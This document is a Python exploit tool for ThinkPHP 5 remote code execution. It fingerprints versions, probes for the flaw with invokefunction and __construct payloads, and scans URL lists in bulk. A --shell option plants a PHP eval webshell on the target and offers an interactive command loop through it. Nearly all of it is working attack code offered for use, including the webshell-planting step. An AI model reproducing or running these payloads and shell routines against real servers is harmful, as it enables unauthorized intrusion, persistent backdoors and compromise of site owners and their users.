# coding: utf-8
# author: w1z4rds
# 后期添加功能：多线程（进程）、GUI版本
import re
import sys
import base64
import optparse
import requests
import subprocess
reload(sys)
sys.setdefaultencoding("utf-8")

headers = {
	"Connection": "close",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
}


# poc
poc_payloads = [
	"/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
	"/?s=index/\\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1",
	"/?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=100",
	"/?s=index/\\think\Request/input&filter=phpinfo&data=1",
	"/?s=index/\\think\\template\driver\\file/write&cacheFile=x.php&content=%3C?php%20phpinfo();?%3E",
	"/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
	"/?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
]
poc_data_payloads = [
	{
		'_method':'__construct',
		'method':'get',
		'filter':'call_user_func',
		'get[]':'phpinfo'
	},
	{
		'_method':'__construct',
		'method':'get',
		'filter':'call_user_func',
		'server[REQUEST_METHOD]':'phpinfo'
	}
]

# exp
exp_payloads = [
	"/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}",
	"/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}",
	"/?s=index/\\think\Request/input&filter=system&data={}",
	"/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}",
	"/?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}"
]
exp_data_payloads = [
	"_method=__construct&filter[]=system&server[REQUEST_METHOD]={}",
	"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={}"
]


'''
@获取框架版本
'''
def get_framework_version(url):
	# 设置会话保持
	s = requests.session()
	pattern = re.compile(r'<span>V(.*?)</span>')
	resp = s.get(url + "/?s=captcha", headers=headers)
	
	# print(resp)
	for con in resp.text.split("\n"):
		if con.count("V5."):
			version = str(pattern.findall(con.strip())[0])
			return version
	print("[-] Sorry, we cannot find the version")



'''
@RCE漏洞检测模块
单个url检测
'''
def check(target_url):
	s = requests.session()
	# Get
	for _p in poc_payloads:
		try:
			resp = s.get(url=target_url + _p, headers=headers)
			if "PHP Version" in resp.text:
				print("[!] RCE vulnerability exists\n")
				return
		except:
			pass
	# Post
	for _p in poc_data_payloads:
		try:
			resp = s.post(url=target_url + "/?s=captcha", headers=headers, data=_p)
			if "PHP Version" in resp.text:
				print("[!] RCE vulnerability exists\n")
				return
		except:
			pass
	print("[-] There's no RCE vulnerability\n")

'''
@RCE漏洞利用模块
模拟cmd环境
'''
def get_shell(target_url):
	s = requests.session()
	cxt = "echo 1qaz2wsx >tmp0okm.txt"
	wsl = "echo ^<?php @eval($_POST[wsl]);?^> >tmp9ijn.php"
	for _p in exp_payloads:
		try:
			resp = s.get(url=target_url + _p.format(cxt), headers=headers)
			resp2 = s.get(url=target_url + "/tmp0okm.txt", headers=headers)
			if resp2.status_code == 200 and "1qaz2wsx" in resp2.text:
				resp3 = s.get(url=target_url + _p.format(wsl), headers=headers)
				resp4 = s.get(url=target_url + "/tmp9ijn.php", headers=headers)
				if resp4.status_code == 200:
					print("[+] Got it!")
					break
		except:
			pass
	
	while True:
		shell = raw_input("Shell >")
		if shell in ("q", "exit", "quit"):
			return

		cmd = "\"wsl=system('" + shell + " >tmp0okm.txt');\" "
		cmd = "curl -s -X POST -d " + cmd + target_url + "/tmp9ijn.php"
		# subprocess执行命令并输出结果
		# 注：可以执行大部分命令，但是需要交互的如del等不要使用
		res = subprocess.check_output(cmd, shell=True)
		resp = s.get(url=target_url + "/tmp0okm.txt", headers=headers)
		print(resp.content)


'''
@批量检测模块
批量url检测
'''
def check_file(target_url_file):
	num = 0
	with open(target_url_file, 'r') as tuf:
		_tuf = tuf.readlines()
		for u in _tuf:
			num += 1
			_u = u.strip()
			if num < len(_tuf):
				print(u"[?] 检测目标：" + u),
			else:
				print(u"[?] 检测目标：" + u)
			check(_u)
		tuf.close()


if __name__ == "__main__":
	print('''\n
___________.__    .__        __   __________  ___ _____________.________
\\__    ___/|  |__ |__| ____ |  | _\\______   \\/   |   \\______   \\   ____/
  |    |   |  |  \\|  |/    \\|  |/ /|     ___/    ~    \\     ___/____  \\ 
  |    |   |   Y  \\  |   |  \\    < |    |   \\    Y    /    |   /       \\
  |____|   |___|  /__|___|  /__|_ \\|____|    \\___|_  /|____|  /______  /
                \\/        \\/     \\/                \\/                \\/ 
___________________ ___________
\\______   \\_   ___ \\_   _____/
 |       _/    \\  \\/ |    __)_ 
 |    |   \\     \\____|        \\
 |____|_  /\\______  /_______  /
        \\/        \\/        \\/ 
''')

	parser = optparse.OptionParser('python %prog ' +'-h (manual)', version='%prog v1.0')
	parser.add_option('-u', dest='target_url', type='string', help='single url')
	parser.add_option('-f', dest='target_url_file', type ='string', help='urls filepath', )
	# parser.add_option('-s', dest='timeout', type='int', default=5, help='set timeout')
	parser.add_option('--shell', dest='shell', action='store_true', help='get webshell')
	
	(options,args) = parser.parse_args()
	target_url = options.target_url
	target_url_file = options.target_url_file
	# timeout = options.timeout
	shell = options.shell

	if target_url:
		# 获取框架版本
		version = get_framework_version(target_url)
		print("[+] ThinkPHP Version: " + version)
		check(target_url)
		if shell:
			get_shell(target_url)
	elif target_url_file:
		check_file(target_url_file)
	else:
		print('''
[-] Error Operation!
[-] eg. python tp5_rce.py -u http://www.web.com
''')